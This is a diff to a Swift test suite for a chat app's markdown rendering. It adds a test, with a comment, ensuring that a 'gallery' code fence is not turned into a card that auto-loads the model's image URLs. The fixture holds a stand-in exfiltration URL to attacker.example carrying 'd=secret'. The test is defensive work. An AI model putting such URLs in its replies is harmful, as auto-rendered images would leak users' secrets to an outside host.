@@ -11,6 +11,7 @@ import Testing
 @Test @MainActor func dataCardsTests() async {
     testTheDataFencesBecomeCards()
     testChartPointsKeepEverySeries()
+    testTheGalleryFenceStaysCodeInTheChat()
     testTheDeltaReadsItsSign()
     await testTheCardWordsAreInBothLanguages()
     testTheModelHearsThatDataWasShown()
@@ -29,6 +30,13 @@ import Testing
     expect(MarkdownView.dataCard(language: CompanionBlocks.chartLanguage, body: "{roto") == nil,
            "fence roto: nil, se queda como código visible")
     expect(MarkdownView.dataCard(language: "swift", body: "{}") == nil, "un fence normal no es tarjeta")
+}
+
+// CN-002: a gallery card would load the model's URLs on render, no click.
+@MainActor func testTheGalleryFenceStaysCodeInTheChat() {
+    let body = #"{"images":[{"url":"https://attacker.example/p.png?d=secret"}]}"#
+    expect(MarkdownView.fenceCard(language: CompanionBlocks.galleryLanguage, body: body) == nil,
+           "gallery: sin tarjeta, el fence queda como código y nada se descarga")
 }
 
 @MainActor func testChartPointsKeepEverySeries() {
